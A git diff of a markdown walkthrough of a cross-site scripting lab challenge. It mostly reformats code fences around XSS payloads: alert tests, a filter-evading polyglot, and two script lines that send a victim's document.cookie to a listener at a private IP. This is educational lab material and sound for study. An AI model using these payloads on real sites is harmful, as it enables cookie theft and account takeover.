@@ -18,6 +18,7 @@ description: "Cross-Site Scripting Ep.7 – D - A walkthrough of the challenge w
 
 
 ![image2](../resources/965da10ce3de4cb08206b180ac07e031.png)
+
 ```java
 <script>window.alert(1)</script>
 ```
@@ -32,7 +33,10 @@ description: "Cross-Site Scripting Ep.7 – D - A walkthrough of the challenge w
 
 
 ![image5](../resources/3320108f120c44b286a3b8a793ee200d.png)
+
+```java
 <script>window.alert("hey")</script>
+```
 
 - The same command gets used but this time it gets sent and stored until the victim opens the message
 
@@ -50,10 +54,12 @@ description: "Cross-Site Scripting Ep.7 – D - A walkthrough of the challenge w
 - Set up Python server
 
 - And send the following to jerry as a message:
+
 ```java
 <script>document.location="http://10.102.164.154:8080/?cookie="+document.cookie;</script>
 ```
 - Or try:
+
 ```java
 <script>fetch("http://10.8.31.73:8000/"+document.cookie)</script>
 ```
@@ -71,6 +77,7 @@ description: "Cross-Site Scripting Ep.7 – D - A walkthrough of the challenge w
 ![image12](../resources/86b5fe4da4ec44c4b9879a4d0384c9dd.png)
 
 - Login with the user:
+
 ```js
 <Script>alert(1)</Script>
 ```
@@ -87,6 +94,7 @@ description: "Cross-Site Scripting Ep.7 – D - A walkthrough of the challenge w
 ![image15](../resources/def49cd6745b4d1f99189caa12b84c67.png)
 
 - Using a polyglot to get past the filter (bit of a cheating way, instead of using trial and error)
+
 ```javascript
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("XSS") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
@@ -100,4 +108,3 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("XSS") )//%0D%0A%0d%0a//</stY
 ![image20](../resources/3643c3c909b34b3486b3aecdb4e83c73.png)![image21](../resources/849cbf03293c42f289ae7c8b15c4b94d.png)
 
 
-![image22](../resources/2022a091738e414a836c7c847e3f6a77.png)![image23](../resources/cdb7e1e8632449f6b8bcfce653ea3fe6.png)
